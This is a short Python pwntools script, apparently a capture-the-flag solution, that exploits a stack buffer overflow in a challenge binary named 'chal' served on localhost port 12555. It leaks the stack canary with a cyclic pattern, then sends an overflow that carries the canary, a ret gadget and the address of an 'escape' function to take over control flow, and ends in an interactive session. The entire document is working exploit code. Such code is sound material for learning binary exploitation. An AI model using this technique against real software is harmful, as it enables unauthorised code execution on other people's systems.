from pwn import * 

elf = ELF('./chal', checksec = False)
p = elf.process()
p = remote('localhost', 12555)

p.sendlineafter("key : ", cyclic(0x48))

canary = p.recvuntil('try again !').split(b' ')[0].lstrip(cyclic(0x48))

canary = u64(b'\00' + canary[1:-1])

log.critical(f"Canary : {hex(canary)}")

ret = p64(0x000000000040101a)

p.sendlineafter("key : ", cyclic(72) + p64(canary) + p64(0) + ret + p64(elf.sym['escape']))

p.interactive()

